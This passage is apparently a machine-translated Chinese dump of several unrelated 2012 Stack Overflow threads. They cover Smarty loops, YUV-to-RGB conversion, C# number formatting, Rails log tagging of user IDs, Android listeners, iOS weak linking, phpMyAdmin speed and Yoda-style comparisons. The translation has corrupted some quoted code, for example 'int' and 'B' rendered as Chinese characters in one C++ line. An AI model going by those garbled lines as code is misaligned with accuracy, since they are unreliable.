         <li><a href="#siteInfo" data-panel="main">One item</a></li>
         <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
         <li><a href="#siteProviders" data-panel="main">One item</a></li>

         <li data-role="list-divider" data-divider-theme="c">One item</li>  <!---------- Section Header -------->
         <li><a href="#equipment" data-panel="main">One item</a></li>
         <li><a href="#scroll" data-panel="main">One itemrts</a></li>
         <li><a href="#context" data-panel="main">One iteme</a></li>
         <li><a href="#context" data-panel="main">Data commissioned</a></li>
    </ul>

    <ul data-role="listview" data-theme="c" data-header-theme="a">
         <li data-role="list-divider" data-header-theme="c">Second Row contains 8 list items</li>  <!----------- Section Header -------->
         <li data-role="list-divider" data-header-theme="a">One item</li> 
         <li><a href="#siteInfo" data-panel="main">One item</a></li>
         <li><a href="#siteContacts" data-panel="main">One itemts</a></li>
         [...] 
```

# php - Smarty：截断没有。{section} 中的 div

> ID：10811381
> 
> 赞同：0
> 
> 时间：2012-05-30T06:57:03.413
> 
> 标签：php, http, smarty

我有类别和子类别。我想选择所有父类别和子类别。但只想在每个父类别下显示 3-4 个子类别。

我的 PHP**代码**

```
 /******Start Categories********/
  $ca=mysql_query('select * from category where parent_id=0');
  while($ca1 = mysql_fetch_array($ca))
{
$ca2[]=$ca1;
}
$smarty->assign('ca2',$ca2);

  /******End Categories********/
   /******Start SubCategories********/
  $sub=mysql_query('select * from category where parent_id!=0 ');
  while($sub1 = mysql_fetch_array($sub))
{
$sub2[]=$sub1;
}
$smarty->assign('sub2',$sub2);

  /******End SubCategories********/ 
```

和 Tpl**代码：**

```
<div id="sub_ltcol">
                {section name=loopc loop=$ca2}
                    <div id="gr_design">
                        <div id="gr_head">
                            <h4>{$ca2[loopc].category_name}</h4>
                        </div>
                        {section name=loops loop=$sub2}
                        {if $ca2[loopc].category_id eq $sub2[loops].parent_id}
                        <div id="gr_body">
                            <ul>
                            <li>
                                    <div class="arw_icon"><img src="images/arw_icon.png"></div>
                                    <a href="#">{$sub2[loops].category_name}</a>
                                </li>
                                <div class="dotted_line"></div>
                            </ul>
                        </div>{/if}
                        {/section}
                    </div>
                    {/section}

                </div> 
```

我只想显示`<li>`标签 3-4 次。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:16:29.117

您可以使用此方法：

```
<div id="sub_ltcol">
{section name=loopc loop=$ca2}
    <div id="gr_design">
        <div id="gr_head">
            <h4>{$ca2[loopc].category_name}</h4>
        </div>
        {section name=loops loop=$sub2}
        {if $ca2[loopc].category_id eq $sub2[loops].parent_id}
        {if $smarty.foreach.loops.index lte 3}
        <div id="gr_body">
            <ul>
            <li>
                    <div class="arw_icon"><img src="images/arw_icon.png"></div>
                    <a href="#">{$sub2[loops].category_name}</a>
                </li>
                <div class="dotted_line"></div>
            </ul>
        </div>{/if}
        {/if}
    {/section}
</div>
{/section}
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:05:34.137

你可以试试

```
{section name=loops loop=$sub2}
  {if $ca2[loopc].category_id eq $sub2[loops].parent_id AND $smarty.section.loops.iteration <= 4}

      ...
  {/if}

{/section} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:19:10.627

如果您只需要显示 3 个子类别，请从 DB 中获取这么多并显示它。你可以使用相同的限制属性

```
 /******Start SubCategories********/
  $sub=mysql_query('select * from category where parent_id!=0 limit 3'); 
```

它还有助于提高页面加载性能。

# c++ - YUV420 到 RGB 的转换没有给出相同的图像？

> ID：10811386
> 
> 赞同：3
> 
> 时间：2012-05-30T06:57:41.190
> 
> 标签：c++, image-processing, rgb, color-scheme, yuv

我正在使用以下代码片段创建虚拟 YUV420 图像。我想使用 Y、U 和 V 组件以 RGB 格式创建相同图像的副本。

我提到了关于 YUV 到 RGB 转换的 Wiki 条目，但它没有给出与 YUV 相同的图像。有什么建议么 ？

**编辑：** **`img`是 RGB32 格式 (ARGB) 的 QImage。**

这是 YUV420 图像：![在此处输入图像描述](../Images/d733f56ec3149e330885eca659ddcbf4.png)

这是 RGB 转换给出的：![在此处输入图像描述](../Images/13de851f0a485ba367665a645233f504.png)

```
 int clamp(int val){
        if(val>255) return 255;
        if(val<0) return 0;
        return val;
    }

    -----
    int h=height;
    int w=width;
    for(y=0;y<h ;y++){
        for(x=0;x<w;x++){

               int hy=y/2;
               int hx=x/2;

               //Populate YUV420 image      
               char compY=x+y+i*3; //Y component
               char compU=128+hy+(i)*2; //U component
               char compV=64+hx+(i)*5;  //V component

               //encoder.setInputPicturePixelData(0,y* l0+x,compY);
               //encoder.setInputPicturePixelData(1,hy*l1+hx,compU);                                 //encoder.setInputPicturePixelData(2,hy*l2+hx,compV);
               //encoder.setInputPicturePixelData(2,hy*l2+hx,compV);

              //Now create the RGB image 

               char R=clamp(compY+1.402*(compV-128));
               char G=clamp(compY-0.3444*(compU-128)-0.714*(compV-128));
               char B=clamp(compY+1.772*(compU-128));

               int RGBval=0xFF<<24 | R<<16 |  G<<8 | B;
               img->setPixel(x,y,RGBval);

             }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:13:41.623

首先，什么是`img`？它本身可能有问题，并且可能以错误的方式放置数据。它可能期望 R、G、B 值以相反的顺序 (B << 16) 或零 alpha 位。

另一件事是`R`, `G`,`B`是 8 位值，您将它们移动太多。你应该这样做：

```
int RGBval= (0xFF << 24) | ((unsigned int) R << 16) |  ((unsigned int) G << 8) | B; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T08:04:27.063

我在什么里面`char compY=x+y+i*3`；你的 YUV420 图片的 FourCC 代码是什么。只有YUV420，我们无法知道图片是 [打包格式还是平面格式](http://www.fourcc.org/yuv.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T08:08:31.020

> char compY=x+y+i*3;

您的图像宽度为 359 像素，并且您不检查 x 或 y 是否在 [0..255] 范围内。该值可能会溢出并环绕。

> 整数 RGBval=0xFF<<24 | R<<16 | G<<8 | 乙;

Qt 有 qRgb 和 qRgba 函数。您应该使用它们而不是自己编写宏。

> char R=clamp(compY+1.402*(compV-128));

**在 C++ 中，char 通常是有符号**的，并将值存储在 range 中`[-128..127]`。因此，如果您从任何正 char 值中减去 128，您将得到负数。这可能不是你想要的。

代替`char`使用`quint8`，`unsigned char`或`uint8_t`。

# c# - 有符号数字 + 或 -

> ID：10811387
> 
> 赞同：1
> 
> 时间：2012-05-30T06:57:48.387
> 
> 标签：c#, string-formatting, sign

> **可能重复：**
> [如何在 c#](https://stackoverflow.com/questions/5301201/how-to-force-a-sign-when-formatting-an-int-in-c-sharp)
> [格式化 Int 时强制使用符号 + 和 - 号格式化数字](https://stackoverflow.com/questions/9782131/format-number-with-and-sign)

我想在有正数或负数时对数字签名（c#）：

```
text = cname + " " + String.Format("{0:0.#}", move) + "%  , \n " + text; 
```

我想要像“+2.5%”这样的正数格式。有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T06:59:49.280

检查 MSDN：[**格式化数字以显示**](http://pranayamr.blogspot.in/2012/06/format-number-to-display.html)

```
string MyString = number.ToString("+#;-#;0"); 
```

`; - Section separator`**- 为正数、负数和零数**定义具有单独格式字符串的部分。

# ruby-on-rails - 如何在 Rails 中记录用户名？

> ID：10811393
> 
> 赞同：17
> 
> 时间：2012-05-30T06:58:08.997
> 
> 标签：ruby-on-rails, logging, devise

我在 Rails 3 中使用 Devise。我想在 production.log 中查看 current_user 的名称。

我想像这样配置rails：

```
config.log_tags = [:user_name] 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-06-19T13:33:22.287

我发现这个有点棘手但有效的解决方案。

Warden 将用户信息存储在 session 中，但 req.session 不可用于记录。

所以你必须把它添加到 config/application.rb

```
config.middleware.delete(ActionDispatch::Cookies)
config.middleware.delete(ActionDispatch::Session::CookieStore)
config.middleware.insert_before(Rails::Rack::Logger, ActionDispatch::Session::CookieStore)
config.middleware.insert_before(ActionDispatch::Session::CookieStore, ActionDispatch::Cookies) 
```

然后创建文件 config/initializers/logging.rb

```
Rails.configuration.log_tags = [
  proc do |req|
    if req.session["warden.user.user.key"].nil?
      "Anonym"
    else
      "user_id:#{req.session["warden.user.user.key"][0][0]}"
    end
  end
] 
```

现在我看到这个匿名：

```
[Anonym] Served asset ... 
```

这对于用户：

```
[user_id:1] Served asset ... 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2015-01-23T19:26:53.077

我使用了 Wojtek Kruszewski 的这个解决方案：[https ://gist.github.com/WojtekKruszewski](https://gist.github.com/WojtekKruszewski)

我对我的项目进行了一些调整，只包含 id，但基本相同。

```
# config/application.rb

config.log_tags = [
  ->(req){
    if user_id = WardenTaggedLogger.extract_user_id_from_request(req)
      user_id.to_s
    else
      "?"
    end
  }
] 
```

并创建这个初始化器

```
# initializers/warden_tagged_logger.rb

module WardenTaggedLogger
  def self.extract_user_id_from_request(req)
    session_key = Rails.application.config.session_options[:key]
    session_data = req.cookie_jar.encrypted[session_key]
    warden_data = session_data["warden.user.user.key"]
    warden_data[0][0]
    rescue
      nil
  end
end 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-11T11:13:28.453

# 2013 年 3 月 7 日添加：

在 Rails 4 中 encrypted_cookie_store 是默认的会话存储。这是您可以访问会话数据的方式：

```
session_data = req.cookie_jar.signed[ "_qnaire_session" ] 
```

看起来warden_data 在我的新应用程序中看起来不同，例如：`[[542], "$2a$10$e5aYxr/PIp6OOj8jzE7mke"]`，其中第一项是用户ID。

这是我当前的片段：[https ://gist.github.com/wojt-eu/5109643](https://gist.github.com/wojt-eu/5109643)

# 以前的版本：

这就是我想出的：

```
config.log_tags = [
  :remote_ip,
  ->(req){
    session_data = req.cookie_jar.signed[ "_qnaire_session" ]
    warden_data = session_data["warden.user.provider_user.key"]
    if warden_data
      '#' + warden_data[1][0].to_s
    else
      "guest"
    end
  }
] 
```

`_qnaire_session`可以用`instance.config.session_options[:key]`或通过单例替换：`Rails.application.config.session_options[:key]`

我有 ProviderUser 模型，因此`warden.user.provider_user.key`. 我想对于用户模型，这将是`warden.user.user.key`.

它很乱，但不会影响正常的身份验证过程、中间件堆栈顺序等。如果在某些更新期间中断，只会影响标记日志，我在查看开发日志时应该很快注意到这一点。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-06-19T20:14:50.353

这是我在 Rails 5.1 中使用的 cookie 解密器，用于用 标记日志`user_id`，它存储在 cookie 中。它基本上让我可以访问相当于`session[:user_id]`原始 cookie的控制器

环境/生产.rb：

```
config.log_tags = [
  :request_id,
  :remote_ip,
  lambda do |req|
    session_data = CookieDecrypter.new(req).session_data
    "user_id:#{session_data['user_id']}"
  end
] 
```

应用程序/模型/cookie_decrypter.rb：

```
class CookieDecrypter
  attr_reader :request

  def initialize(request)
    @request = request
  end

  def session_data
    cookie = request.cookies[session_key]
    return {} unless cookie.present?
    cookie = CGI::unescape(cookie)
    key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
    secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
    sign_secret = key_generator.generate_key(signed_salt)
    encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON)
    encryptor.decrypt_and_verify(cookie) || {}
  end

  private

  def session_key
    Rails.application.config.session_options[:key]
  end

  def secret_key_base
    Rails.application.secrets[:secret_key_base]
  end

  def salt
    Rails.application.config.action_dispatch.encrypted_cookie_salt
  end

  def signed_salt
    Rails.application.config.action_dispatch.encrypted_signed_cookie_salt
  end
end 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-08T10:03:37.667

而现在完全不同的东西......

[https://github.com/roidrage/lograge/issues/23#issuecomment-11709861](https://github.com/roidrage/lograge/issues/23#issuecomment-11709861)

我刚刚使用 Rails 4、最新的 Devise 和 Lograge 进行了尝试。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-05-30T09:01:19.370

不幸的是，日志标签只在请求委托的一开始就被评估一次（在`Rails::Rack::Logger`中间件中）。在这个阶段没有控制器，所以任何 current_user 帮助器都不可用。还没有设置守望者甚至会话，但至少有一个 cookiejar，所以如果您将 session_id 存储在那里，您可以直接恢复会话或记录 session_id。

```
config.log_tags = [ lambda { |req| req.cookie_jar["_session_id"].to_s } ] 
```

我认为最好的选择是将用户名直接存储在 cookie 中的 log_in 中，并在会话中销毁它。

```
config.log_tags = [ lambda { |req| req.cookie_jar["user_name"] || 'Noone' } ] 
```

不工作：

但是如果你使用devise，它使用warden raack中间件，所以`env['warden']`应该是可用的，你可以试试吗？

```
config.log_tags = [ lambda { |req| user = req.env['warden'].user; user && user.name || 'Noone'; } ] 
```

即使没有守望者，由于您确实有可用的会话`env['rack.session']`，如果您将用户 ID 存储在会话中，您可以执行类似的操作

```
config.log_tags = [ lambda { |req| user = User.find_by_id(req.env['rack.session']['user_id']); user && user.name || 'Noone'; } 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-06-13T21:11:55.063

这是我刚刚添加的内容`config/initializers/logging.rb`：

```
Rails.configuration.log_tags = [
  :uuid,   # request UUID
  lambda { |req|
    # Credentials are (currently) in the format of:
    #
    #   <session_hash>::<user_id>
    #
    # So we have to split by '::' to obtain the user_id for logging.
    #
    # This will just output "User: nil" if there is no current session.
    "User: #{req.cookies['user_credentials'].to_s.split('::')[1]}"
  }
] 
```

这是针对 Authlogic 的。您需要做的可能会有所不同，因此您应该真正深入研究并查看您的数据已经向您公开了什么。

步骤1：

查看`req`对象有什么可用的。将此添加到`config/initializers/logging.rb`：

```
Rails.configuration.log_tags = [
  lambda { |req|
    req.inspect
  }
] 
```

然后点击一个页面，看看什么被转储了。

第 2 步：查看您的 cookie jar 是否有足够的信息，使用相同的技术：

```
Rails.configuration.log_tags = [
  lambda { |req|
    req.cookies.inspect
  }
] 
```

（点击请求）

顺便说一句：不要担心将用户名/电子邮件放入日志 - 用户 ID 就足够了，您可以在数据库中查找它以获得所需的任何额外元数据。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2017-03-01T19:42:31.803

几乎对我有用的（Rails 3.2.22.2）是这里的答案：http: [//benjit.com/rails/logger/2016/02/26/getting-admin-user-into-rails-logfile/](http://benjit.com/rails/logger/2016/02/26/getting-admin-user-into-rails-logfile/)

这假定`cookie_jar`对象响应`encrypted`。然而，对我来说并非如此。最终对我有用的方法如下：

`config/initializers/logging.rb`：

```
Rails.configuration.log_tags = [
  lambda { |req|
    session_key = Rails.application.config.session_options[:key]
    session_data = req.cookie_jar.signed[Rails.application.config.session_options[:key] ]
    warden_data = ( session_data["warden.user.user.key"]|| [[]])
    admin_user = warden_data[0][0]
    "u: #{admin_user || 0}"
  }
] 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2013-01-22T13:00:26.523

正如@viktortron在初始化时[的回答](https://stackoverflow.com/a/10813097/316700)`log_tags`中所说，我们没有合适的`session`对象可用，但`session_id`在请求中。

如果您使用的是 _database session_store_，就像我的情况一样，您可以临时重建*会话：*

```
session = ActiveRecord::SessionStore::Session.find_by_session_id(request.cookie_jar["_session_id"]) 
```

这就是我`log_tags`的定义：

```
# config/initializers/rails_log.rb
def get_user_id(req)
  session = ActiveRecord::SessionStore::Session.find_by_session_id(req.cookie_jar["_session_id"])
  result = session ? session.data["user_id"] : 0

  "%07d" % result
end

log_tags = []
log_tags << lambda { |req| Time.now.strftime("%F %T.%L") }
log_tags << lambda { |req| req.uuid.first(8) }
log_tags << lambda { |req| get_user_id(req) }

Rails.configuration.log_tags = log_tags 
```

结果是这样的：

```
[2013-01-22 13:51:36.659] [e52435d1] [0036484] <the log line> 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2015-08-07T16:54:30.840

我正在使用[Swards 解决方案](https://stackoverflow.com/a/28117273/518204)，它就像一个魅力。但是使用`begin..rescue`而不是Hash#has_key？是性能杀手

```
require 'benchmark/ips'

good_hash = { 'warden.user.admin_user.key' => [[1]]}
bad_hash = {}

Benchmark.ips do |x|
  x.report('begin+rescue good hash') { good_hash['warden.user.admin_user.key'][0][0] }
  x.report('has_key good hash') do
    good_hash.has_key?('warden.user.admin_user.key') &&
        good_hash['warden.user.admin_user.key'][0][0]
  end

  x.report('begin+rescue bad hash') { bad_hash['warden.user.admin_user.key'][0][0] rescue nil }
  x.report('has_key bad hash') do
    if bad_hash.has_key?('warden.user.admin_user.key')
      bad_hash['warden.user.admin_user.key'][0][0]
    end
  end

  # Compare the iterations per second of the various reports!
  x.compare!
end 
```

结果不言自明

```
Comparison:
    has_key bad hash:  4870164.1 i/s
begin+rescue good hash:  3544134.7 i/s - 1.37x slower
   has_key good hash:  2127500.6 i/s - 2.29x slower
begin+rescue bad hash:     4468.2 i/s - 1089.95x slower 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-01-18T05:40:02.050

As a quick and ugly workaround, maybe one could log a second line after the request has been processed.

This 500 ServerError has been presented by: #{username}

* * *

## 回答 #12

> 赞同：-2
> 
> 时间：2013-09-24T18:13:50.273

对于使用 Redis::Store @fjuillen 的任何人来说，答案如下所示：

```
redis = Redis::Store.new
redis.select 3 # only if you use a different database
result = redis.get req.cookie_jar["_session_id"] 
```

在轨道 4 上测试。

# android - Android 位置监听器（或一般的 Android 事件）

> ID：10811400
> 
> 赞同：5
> 
> 时间：2012-05-30T06:58:37.387
> 
> 标签：android

我有一个关于 Android 中 LocationListener 的一般性问题。也许这通常与 Android 或 Java 事件有关，但不确定。

似乎有一百万种方法可以设置 LocationListener，而且它们看起来都很丑陋（主要是因为缺乏可重用性）。这是一个来自 android 的[例子](http://developer.android.com/guide/topics/location/obtaining-user-location.html)：

```
// Acquire a reference to the system Location Manager
LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);

// Define a listener that responds to location updates
LocationListener locationListener = new LocationListener() {
    public void onLocationChanged(Location location) {
      // Called when a new location is found by the network location provider.
      makeUseOfNewLocation(location);
    }

    public void onStatusChanged(String provider, int status, Bundle extras) {}

    public void onProviderEnabled(String provider) {}

    public void onProviderDisabled(String provider) {}
  };

// Register the listener with the Location Manager to receive location updates
locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener); 
```

这行得通，但是，我真的很惊讶这是编写 OOP 代码的标准方式......

我真正希望看到的是一种实现LocationListener的简单*可重用方式。*任何人都知道如何做到这一点的简单教程？我的目标是能够轻松地实现任何需要使用 gps 信息更新的活动......也许是服务？谢谢！

# ios - iOS 和 Phonegap 中的捆绑版本

> ID：10811402
> 
> 赞同：0
> 
> 时间：2012-05-30T06:58:40.040
> 
> 标签：ios, cordova

我想在 phonegap 中检索我的应用程序的简短版本和捆绑版本。有什么想法我该怎么做？

使用`device.version`from phonegap api 将返回设备操作系统的版本号。

# cocoa-touch - 为什么在 iOS 4.2.1 上检查 [NSMetadataQuery 类] 会崩溃？

> ID：10811403
> 
> 赞同：1
> 
> 时间：2012-05-30T06:58:48.787
> 
> 标签：cocoa-touch, ios4, nsmetadataquery

我正在尝试使用[Marco Arment 描述的这种方法，在使用它之前检查一个类是否存在](http://www.marco.org/2010/11/22/supporting-older-versions-of-ios-while-using-new-apis)。使用正确的设置，类会在适当的时候自动弱链接。正如 Marco 所描述的，“您可以安全地继承子类或拥有指向您想要的任何东西的指针（只要您小心不要在它们不可用时实例化它们）”。

我的应用在 iOS 5 上运行良好。我遵循了链接中提到的条件：

*   基础 SDK 是最新的 iOS (iOS 5.1)
*   部署目标是 iOS 4.0
*   C/C++/Objective-C 的编译器是 Apple LLVM 编译器 3.1（也尝试过 LLVM GCC 4.2）

每当我引用 NSMetadataQuery 时，我都会确保该类首先存在：

```
if ([NSMetadataQuery class] != nil) … 
```

尽管如此，如果我尝试在装有 iOS 4.2.1 的 iPod touch 上运行我的应用程序，它会在启动时立即崩溃：

```
dyld: Symbol not found: _OBJC_CLASS_$_NSMetadataQuery 
```

我已经尝试注释掉我的应用程序运行正常的所有代码。一旦我添加回对 NSMetadataQuery 的单个引用，它就会崩溃。我什至试过这个：

```
if ([NSMetadataQuery class] != nil) NSLog(@"OK"); 
```

简单地包括该行，并且没有对 NSMetadataQuery 的其他引用，会使应用程序崩溃。更奇怪的是，检查其他 iOS 5 类不会导致任何问题：

```
if ([UIDictationPhrase class] != nil) NSLog(@"OK"); 
```

正如预期的那样，效果很好。

我已经能够使用 uglier 解决该问题`NSClassFromString()`以确保该类存在，但我很想知道为什么其他方法不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-07T05:59:43.923

我对此没有任何解释，但我遇到了和你一样的问题。无论我/你做什么，NSMetadataQuery 都不会被弱链接......

参考这个答案，这确实是另一个问题中最好的答案：

[https://stackoverflow.com/a/8426591/129202](https://stackoverflow.com/a/8426591/129202)

简而言之，其他自动弱链接似乎有效，只是`NSMetadataQuery*`您必须从源代码中删除并替换为`id`. 用 etc 实例化该类。但是`NSClassFromString()`，其他类不会出现问题，`UIDocument`因此您可以以正常的无汗方式安全地使用它们。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-30T07:40:09.707

`NSMetadataQuery`在 iOS 5.0 及更高版本中可用，因此任何低于该版本的版本都不知道它是什么。通过仅在代码中使用它，类名将被添加到符号表中，并在应用程序启动时进行查找。

# phpmyadmin - phpMyAdmin 和大表

> ID：10811405
> 
> 赞同：10
> 
> 时间：2012-05-30T06:58:52.983
> 
> 标签：phpmyadmin

尝试访问具有大表的数据库（此数据库中至少有 15 个表，不少于 100 万，最大 - 2000 万）。一旦我选择数据库 - phpMyAdmin 加载至少 5 分钟（甚至更多）。

如何使用表格加快页面的加载速度？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-16T03:49:41.123

将这些行粘贴到 phpMyAdmin 安装中 config.inc.php 文件的底部：

```
//http://future500.nl/phpmyadmin-slow-on-startup/:
$cfg['MaxExactCountViews'] = 0;//disable trying to count the number of rows in any view
$cfg['MaxExactCount'] = 0;//disable correcting the InnoDB estimates 
```

感谢future500.nl！

我希望在我不小心删除所有数据之前几个小时就找到了这个修复程序。:-(

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T11:58:03.900

也许我们可以和其他感兴趣的人一起追捕这个？

我标记了访问缓慢的列`intormation_schema.tables`：

```
SELECT 

`TABLE_CATALOG`
,`TABLE_SCHEMA`
,`TABLE_NAME`
,`TABLE_TYPE`
,`ENGINE`
,`VERSION`
,`ROW_FORMAT`      ------SLOW
,`TABLE_ROWS`      ------SLOW
,`AVG_ROW_LENGTH`  ------SLOW
,`DATA_LENGTH`     ------SLOW
,`MAX_DATA_LENGTH` ------SLOW
,`INDEX_LENGTH`    ------SLOW
,`DATA_FREE`       ------SLOW
,`AUTO_INCREMENT`  ------SLOW
,`CREATE_TIME`     ------SLOW
,`UPDATE_TIME`     ------SLOW
,`CHECK_TIME`      ------SLOW
,`TABLE_COLLATION`
,`CHECKSUM`        ------SLOW
,`CREATE_OPTIONS`
,`TABLE_COMMENT`

 FROM `tables` WHERE 1 
```

此外，导航框架是`/navigation.php`调用

`/libraries/common.lib.php => PMA_getTableList()`然后调用

`/libraries/database_interface.lib.php => PMA_DBI_get_tables_full()`

其中包含慢查询之一。

我在此替换了慢速 SELECT 列：

```
SELECT *,
`TABLE_SCHEMA`       AS `Db`,
`TABLE_NAME`         AS `Name`,
`TABLE_TYPE`         ÀS `TABLE_TYPE`,
`ENGINE`             AS `Engine`,
`ENGINE`             AS `Type`,
`VERSION`            AS `Version`,
`ROW_FORMAT`         AS `Row_format`,
`TABLE_ROWS`         AS `Rows`,
`AVG_ROW_LENGTH`     AS `Avg_row_length`,
`DATA_LENGTH`        AS `Data_length`,
`MAX_DATA_LENGTH`    AS `Max_data_length`,
`INDEX_LENGTH`       AS `Index_length`,
`DATA_FREE`          AS `Data_free`,
`AUTO_INCREMENT`     AS `Auto_increment`,
`CREATE_TIME`        AS `Create_time`,
`UPDATE_TIME`        AS `Update_time`,
`CHECK_TIME`         AS `Check_time`,
`TABLE_COLLATION`    AS `Collation`,
`CHECKSUM`           AS `Checksum`,
`CREATE_OPTIONS`     AS `Create_options`,
`TABLE_COMMENT`      AS `Comment` 
```

对此：

```
SELECT 
`TABLE_SCHEMA`        AS `Db`,
`TABLE_NAME`          AS `Name`,
`TABLE_TYPE`          AS `TABLE_TYPE`,
`ENGINE`              AS `Engine`,
`ENGINE`              AS `Type`,
`VERSION`             AS `Version`,
'Compact'             AS `Row_format`,
0                     AS `Rows`,
0                     AS `Avg_row_length`,
0                     AS `Data_length`,
0                     AS `Max_data_length`,
0                     AS `Index_length`,
0                     AS `Data_free`,
0                     AS `Auto_increment`,
'2000-01-01 00:00:00' AS `Create_time`,
NULL                  AS `Update_time`,
NULL                  AS `Check_time`,
`TABLE_COLLATION`     AS `Collation`,
NULL                  AS `Checksum`,
`CREATE_OPTIONS`      AS `Create_options`,
`TABLE_COMMENT`       AS `Comment` 
```

这使得查询运行得很快。（例如，我通常不需要行数。我也可以手动获取它们。或者安装 2 个 PhpMyAdmin。）

注意：从现在开始，被覆盖的值应该在管理页面上显示为虚拟值 - 但我可以忍受这种情况，而不是缓慢的速度。

但是必须有其他慢查询很好，因为它仍然加载缓慢。

所以，只是想分享这个，有人可能会继续。现在，我没有更多的时间了。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-05-30T07:07:41.327

phpMyAdmin 是基于浏览器的网页工具。您为什么不尝试一些其他工具来处理数据库，例如[sqlyog](http://www.webyog.com/en/)。

# c# - 在文字值的相等比较中，操作数的顺序是否重要？

> ID：10811410
> 
> 赞同：6
> 
> 时间：2012-05-30T06:59:10.253
> 
> 标签：c#, .net, performance

我习惯把代码写成（只是一个例子）

```
Request.QueryString["xxxx"] != null 
```

最近有人说

```
null != Request.QueryString["xxxx"] 
```

提供更好的性能。

我很想知道它是否真的带来了任何差异，如果是的话，如何？

注意~以上只是一个例子。笼统地说

无论

```
Constant [Operator] Actual Value (e.g. 1 == Convert.ToInt32(textbox1.text)) 
```

好于

```
Actual Value [Operator] Constant (e.g. Convert.ToInt32(textbox1.text) == 1) 
```

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-30T07:00:07.157

## 什么

[这是一种用于具有许多隐式类型转换的语言的编码风格（由于他的OSV](http://en.wikipedia.org/wiki/Object%E2%80%93subject%E2%80%93verb)词序，友好地命名为来自星球大战角色的 Yoda ）。有时它甚至被项目指南强制执行和要求，以防止因拼写错误而产生的某种错误。不同的语言对这种风格有不同的*变体*和扩展，但我会将这个答案限制为 C 和 C#。

## 为什么是

例如，在 C 中，您可以编写：

```
int a = CalculateValue();
if (a = CalculateAnotherValue()) {
    /* Do something */
} 
```

此代码将分配给`a`从返回的值，`CalculateValue()`然后它将用结果覆盖该值，`CalculateAnotherValue()`如果它不为零，那么它将执行代码。可能这不是打算做的，`if`表达式中的赋值是一个错误。从您的示例中，`NULL`您可能有：

```
if (pBuffer = NULL) 
```

同样，这可能不是您想要的（这是一个很常见的错误），您将 NULL 分配给指针并且条件将始终为 false。如果你写：

```
if (NULL = pBuffer) 
```

它不会编译（因为你不能为文字赋值）并且你会得到一个编译时错误。

这种编译时检查并不是使用这种编码风格的唯一原因，看看这个 C#（非常常见）代码：

```
if (text != null && text.Equals("something", StringComparison.InvariantCulture)
    DoSomething(); 
```

它可以签约为：

```
if ("something".Equals(text, StringComparison.InvariantCulture))
    DoSomething(); 
```

## 为什么不

在 C#中*通常*没关系。*这是继承*自 C/C++的一种做法。因为在 C# 中表达式不会自动转换为`bool`以下代码将无法编译：

```
if (Request.QueryString["PartnerID"] = null) 
```

然后这种做法在 C# 中是没有用的（@IlianPinzon 在评论中指出的例外），与性能无关，它只是用来避免此类错误。

关于*为什么是*部分中的最后一个示例，问题在于可读性，写`"something".Equals(text)`起来就像说“如果那个人开心的话”而不是“如果这个人很开心”。

## 表现

从这些功能开始：

```
static bool TestRight(object value)
{ return value == null; }

static bool TestLeft(object value)
{ return null == value; } 
```

他们产生以下IL：

```
.maxstack 2
.locals init ([0] bool CS$1$0000)
L_0000: nop 
L_0001: ldnull 
L_0002: ldarg.0 
L_0003: ceq 
L_0005: stloc.0 
L_0006: br.s L_0008
L_0008: ldloc.0 
L_0009: ret 
```

唯一的区别在于 L_0001 和 L_0002 行，它们只是交换了，但其操作数的顺序不会改变`ceq`. 即使您覆盖`Equals()`方法，JIT 编译器也会为两个表达式生成相同的汇编代码（因为比较总是由`Equals()`,`null`是*无类型*的）。

如果比较涉及用户定义的相等比较器，事情可能会更复杂，在这种情况下，没有规则，它将取决于有效的`op_Equals`实现。例如这个`==`实现：

```
public static bool operator==(MyType lhs, MyType rhs)
{
    if (Object.ReferenceEquals(lhs, rhs))
        return true;

    if (Object.ReferenceEquals(lhs, null))
        return false;

    return lhs.Equals(rhs);
} 
```

在这种情况下，如果第一个操作数是`null`执行将稍微快一点（因为`MyType.Equals()`甚至不会被调用），但这种性能增益非常小：您节省了一个比较，很少的跳转和一个虚函数调用。此外，您可以在相反的情况下将函数重写为更快（如果您真的对此很在意）。

这是一个小测试，`MyType.Equals(object)`只返回`true`任何非`null`参数。测试将循环`Int32.MaxValue`次数：

```
操作总时间（毫秒）
lhs == null 10521
空== lhs 2346

```

似乎避免不必要调用的“优化”版本`Equals()`快了五倍，但请注意循环计数非常高并且实际实现`Equals()`是空的，真正的实现将减少函数调用的相对开销（可能你会除了这个**微优化**还有其他事情要做）。对于系统类，您不能依赖此详细信息，例如`String.Equals()`将始终由操作员调用（无论顺序如何），但您不能假设一个代码路径更快，并且这一事实在框架的未来版本中不会改变（或针对不同的 CPU 架构）。

* * *

## 回答 #2

